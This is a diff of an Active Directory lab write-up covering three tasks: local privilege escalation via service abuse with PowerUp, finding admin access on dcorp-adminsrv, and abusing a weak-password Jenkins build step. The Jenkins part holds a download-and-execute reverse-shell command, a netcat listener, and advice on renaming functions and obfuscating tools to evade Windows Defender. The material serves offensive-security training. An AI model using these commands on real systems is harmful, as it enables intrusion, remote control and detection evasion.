@@ -2,19 +2,19 @@
 
 ## Tasks
 
-1. **Exploit a service on `dcorp-studentx` and elevate privileges to local administrator**
-2. **Identify a machine in the domain where `studentx` has local administrative access**
+1. **Exploit a service on `dcorp-student422` and elevate privileges to local administrator**
+2. **Identify a machine in the domain where `student422` has local administrative access**
 3. **Using privileges of a user on Jenkins on `172.16.3.11:8080`, get admin privileges on `172.16.3.11`, the `dcorp-ci` server**
 
 ---
 
 ## Solution
 
-1. **Exploit a service on `dcorp-studentx` and elevate privileges to local administrator**
+1. **Exploit a service on `dcorp-student422` and elevate privileges to local administrator**
 
 **Local Privilege Escalation - PowerUp**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -24,109 +24,6 @@ dcorp\student422
 `hostname`:
 ```
 dcorp-std422
-```
-
-We can use Powerup from PowerSploit module to check for any privilege escalation path.
-
-**Note:** Remember to run PowerUp from a PowerShell session started using Invisi-Shell.
-
-`cd \AD\Tools`
-
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
-`Import-Module C:\AD\Tools\PowerUp.ps1`
-
-`Get-Module`:
-```
-ModuleType Version    Name                                ExportedCommands
----------- -------    ----                                ----------------
-Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}📌
-Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler, Set-PSReadLineKeyHandler...}
-```
-
-`Invoke-AllChecks`:
-```
-[*] Running Invoke-AllChecks
-
-[*] Checking if user is in a local group with administrative privileges...
-
-[*] Checking for unquoted service paths...
-
-
-ServiceName    : AbyssWebServer📌
-Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
-ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
-CanRestart     : True📌
-Name           : AbyssWebServer
-Check          : Unquoted Service Paths📌
-
-ServiceName    : AbyssWebServer
-Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
-ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
-StartName      : LocalSystem
-AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
-CanRestart     : True
-Name           : AbyssWebServer
-Check          : Unquoted Service Paths
-
-[SNIP]
-
-[*] Checking service executable and argument permissions...
-
-ServiceName                     : AbyssWebServer
-Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service📌
-ModifiableFile                  : C:\WebServer\Abyss Web Server
-ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
-ModifiableFileIdentityReference : Everyone📌
-StartName                       : LocalSystem📌
-AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'📌
-CanRestart                      : True
-Name                            : AbyssWebServer
-Check                           : Modifiable Service Files
-
-[SNIP]
-
-[*] Checking service permissions...
-
-ServiceName   : AbyssWebServer📌
-Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
-StartName     : LocalSystem📌
-AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'📌
-CanRestart    : True📌
-Name          : AbyssWebServer
-Check         : Modifiable Services
-
-ServiceName   : SNMPTRAP📌
-Path          : C:\Windows\System32\snmptrap.exe
-StartName     : LocalSystem📌
-AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'📌
-CanRestart    : True📌
-Name          : SNMPTRAP
-Check         : Modifiable Services
-
-[SNIP]
-```
-
-Let’s use the abuse function for `Invoke-ServiceAbuse` and add our current domain user to the local Administrators group.
-
-`Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student422' -Verbose`:
-```
-VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
-VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
-VERBOSE: Executing command 'net localgroup Administrators dcorp\student422 /add'
-VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\student422 /add'⏫
-VERBOSE: Restoring original path to service 'AbyssWebServer'
-VERBOSE: binPath for AbyssWebServer successfully set to 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
-VERBOSE: Leaving service 'AbyssWebServer' in stopped state
-
-ServiceAbused  Command
--------------  -------
-AbyssWebServer net localgroup Administrators dcorp\student422 /add
 ```
 
 `whoami /all`:
@@ -174,11 +71,106 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
+We can use Powerup from PowerSploit module to check for any privilege escalation path.
+
+**Note:** Remember to run PowerUp from a PowerShell session started using Invisi-Shell.
+
+`cd \AD\Tools`
+
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
+```
+[SNIP]
+```
+
+`Import-Module C:\AD\Tools\PowerUp.ps1`
+
+`Invoke-AllChecks`:
+```
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...📌
+
+
+ServiceName    : AbyssWebServer📌
+Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
+ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
+CanRestart     : True📌
+Name           : AbyssWebServer
+Check          : Unquoted Service Paths📌
+
+ServiceName    : AbyssWebServer
+Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
+ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
+CanRestart     : True
+Name           : AbyssWebServer
+Check          : Unquoted Service Paths
+
+[SNIP]
+
+[*] Checking service executable and argument permissions...📌
+
+ServiceName                     : AbyssWebServer
+Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service📌
+ModifiableFile                  : C:\WebServer\Abyss Web Server
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : Everyone📌
+StartName                       : LocalSystem📌
+AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'📌
+CanRestart                      : True
+Name                            : AbyssWebServer
+Check                           : Modifiable Service Files
+
+[SNIP]
+
+[*] Checking service permissions...
+
+ServiceName   : AbyssWebServer📌
+Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
+StartName     : LocalSystem📌
+AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'📌
+CanRestart    : True📌
+Name          : AbyssWebServer
+Check         : Modifiable Services
+
+ServiceName   : SNMPTRAP📌
+Path          : C:\Windows\System32\snmptrap.exe
+StartName     : LocalSystem📌
+AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'📌
+CanRestart    : True📌
+Name          : SNMPTRAP
+Check         : Modifiable Services
+
+[SNIP]
+```
+
+Let's use the abuse function `Invoke-ServiceAbuse` and add our current domain user to the local "Administrators" group.
+
+`Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student422' -Verbose`:
+```
+VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
+VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
+VERBOSE: Executing command 'net localgroup Administrators dcorp\student422 /add'
+VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\student422 /add'⏫
+VERBOSE: Restoring original path to service 'AbyssWebServer'
+VERBOSE: binPath for AbyssWebServer successfully set to 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
+VERBOSE: Leaving service 'AbyssWebServer' in stopped state
+
+ServiceAbused  Command
+-------------  -------
+AbyssWebServer net localgroup Administrators dcorp\student422 /add
+```
+
 We can see that the `dcorp\student422` is a local administrator now.
 
 Just logoff and logon again and we have local administrator privileges!
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `whoami /all`:
 ```
@@ -231,19 +223,11 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 **Local Privilege Escalation - WinPEAS**
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
-`whoami`:
-```
-dcorp\student422
-```
+You can use WinPEAS using the following command.
 
-`hostname`:
-```
-dcorp-std422
-```
-
-You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS.
+**Note that we use an obfuscated version of WinPEAS.**
 
 `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log`:
 ```
@@ -253,7 +237,7 @@ You can use WinPEAS using the following command. Note that we use an obfuscated 
 [+++] KERNELBASE.DLL IS UNHOOKED!
 [+++] ADVAPI32.DLL IS UNHOOKED!
 [+] URL/PATH : C:\AD\Tools\winPEASx64.exe Arguments : notcolor log
-"log" argument present, redirecting output to file "out.txt"
+"log" argument present, redirecting output to file "out.txt"📌
 ```
 
 Spend some time analyzing the output of WinPEAS. You will find useful information in the 'Services Information' section of the output.
@@ -303,17 +287,7 @@ Spend some time analyzing the output of WinPEAS. You will find useful informatio
 
 Similarly, we can use PrivEscCheck for a nice summary of possible privilege escalation opportunities.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `. C:\AD\Tools\PrivEscCheck.ps1`
 
@@ -397,29 +371,19 @@ Vulnerable     : True
 ```
 🚩
 
-2. **Identify a machine in the domain where `studentx` has local administrative access**
+2. **Identify a machine in the domain where `student422` has local administrative access**
 
 **Hunt for Local Admin access**
 
-Now for the next task, to identify a machine in the domain where `student422` has local administrative access, use `Find-PSRemotingLocalAdminAccess.ps1`.
+To identify a machine in the domain where `student422` has local administrative access, we can use `Find-PSRemotingLocalAdminAccess.ps1`.
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
 `Find-PSRemotingLocalAdminAccess`:
 ```
-dcorp-adminsrv
+dcorp-adminsrv🖥️
 ```
 
 So, `student422` has administrative access on `dcorp-adminsrv` and on the student machine. We can connect to `dcorp-adminsrv` using `winrs` as the `student422` user.
@@ -433,19 +397,9 @@ C:\Users\student422>
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+<🔄 Alternative Step🔄>
 
-`set username`:
-```
-USERNAME=student422
-```
-
-`set computername`:
-```
-dcorp-adminsrv
-```
-
-We can also use PowerShell Remoting.
+We can also use PowerShell Remoting to connect to `dcorp-adminsrv` as the `student422` user.
 
 `Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local`:
 ```
@@ -456,14 +410,16 @@ dcorp-adminsrv
 ```
 🚀
 
-![Victim: dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+</🔄 Alternative Step🔄>
 
-`whoami`:
+![dcorp-adminsrv | student422](https://custom-icon-badges.demolab.com/badge/dcorp--adminsrv-student422-64b5f6?logo=windows11&logoColor=white)
+
+`set username`:
 ```
-dcorp\student422
+USERNAME=student422
 ```
 
-`hostname`:
+`set computername`:
 ```
 dcorp-adminsrv
 ```
@@ -473,32 +429,22 @@ dcorp-adminsrv
 
 **Abuse Jenkins Instance**
 
-Next, let’s try our hands on the Jenkins instance.
+Next, let's try our hands on the Jenkins instance.
 
-To be able to execute commands on Jenkins server without admin access we must have privileges to configure builds.
+To be able to execute commands on Jenkins server without admin access **we must have privileges to configure builds**.
 We have a misconfigured Jenkins instance on `dcorp-ci` (`http://172.16.3.11:8080`). If we go to the `People` page of Jenkins we can see the users present on the Jenkins instance.
 
 ![Jenkins - People](./assets/screenshots/learning_objective_05_jenkins_people.png)
 
-**Note:** Remember to use Edge to open the Jenkins web console!
-
 Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. By manually trying the usernames as passwords we can identify that the user "builduser" has password "builduser". The user "builduser" can configure builds and add build steps which will help us in executing commands.
 
-Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use `download execute` cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of `Invoke-PowerShellTcp` from Nishang. We renamed the function `Invoke-PowerShellTcp` to `Power` in the script to bypass Windows Defender.
+Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use `download execute` cradle in Jenkins build step.
+
+You can use any reverse shell, below we are using a slightly modified version of `Invoke-PowerShellTcp` from [Nishang](https://github.com/samratashok/nishang). We renamed the function `Invoke-PowerShellTcp` to `Power` in the script **to bypass Windows Defender**.
 
 ![Invoke-PowerShellTcp - Obfuscation](./assets/screenshots/learning_objective_05_invokepowershelltcp_obfuscation.png)
 
-![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-dcorp\student422
-```
-
-`hostname`:
-```
-dcorp-std422
-```
+![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
 `ipconfig`:
 ```
@@ -514,7 +460,9 @@ Ethernet adapter Ethernet 9:
    Default Gateway . . . . . . . . . : 172.16.100.254
 ```
 
-If using `Invoke-PowerShellTcp`, make sure to include the function call in the script `Power -Reverse -IPAddress 172.16.100.22 -Port 443` or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.
+If using `Invoke-PowerShellTcp`, make sure to include the function call in the script `Power -Reverse -IPAddress 172.16.100.22 -Port 443` or append it at the end of the command in Jenkins.
+
+**Please note that you may always like to rename the function name to something else to avoid detection.**
 
 ```
 powershell.exe iex (iwr http://172.16.100.22/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.22 -Port 443
@@ -526,24 +474,28 @@ Save the configuration.
 
 Double check the following:
 - Remember to host the reverse shell on a local web server on your student VM. You can find `hfs.exe` in the `C:\AD\Tools` directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
-- Also, make sure to **add an exception** or **turn off the firewall** on the student VM.
+- Also, make sure to **add an exception or turn off the firewall** on the student VM.
 - Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
 - After you build the project below, check the `Console Output` of the Jenkins Project to know more about the error.
 
 ![HFS - Invoke-PowerShellTcp.ps1](./assets/screenshots/learning_objective_05_hfs_invokepowershelltcp.png)
 
-![Windows Firewall - Turn Off](./assets/screenshots/learning_objective_05_windows_firewall_turn_off.png)
+![Windows Firewall - Turn off](./assets/screenshots/learning_objective_05_windows_firewall_turn_off.png)
 
 On the student VM, run a netcat or powercat listener which listens on the port which we used above.
 
 `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`:
 ```
 listening on [any] 443 ...
+
+[...]
 ```
 
 On Jenkins web console, launch the Build by clicking on `Build Now` and on the listener, you will see:
 
 ```
+[...]
+
 172.16.3.11: inverse host lookup failed: h_errno 11004: NO_DATA
 connect to [172.16.100.22] from (UNKNOWN) [172.16.3.11] 52915: NO_DATA
 Windows PowerShell running as user ciadmin on DCORP-CI
@@ -555,7 +507,7 @@ PS C:\Users\Administrator\.jenkins\workspace\Project11>
 
 We can now run commands on the reverse shell.
 
-![Victim: dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
+![dcorp-ci | ciadmin](https://custom-icon-badges.demolab.com/badge/dcorp--ci-ciadmin-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -576,7 +528,7 @@ Ethernet adapter Ethernet:
 
    Connection-specific DNS Suffix  . :
    Link-local IPv6 Address . . . . . : fe80::2142:a456:11a2:dfb4%5
-   IPv4 Address. . . . . . . . . . . : 172.16.3.11
+   IPv4 Address. . . . . . . . . . . : 172.16.3.11📌
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 172.16.3.254
 ```
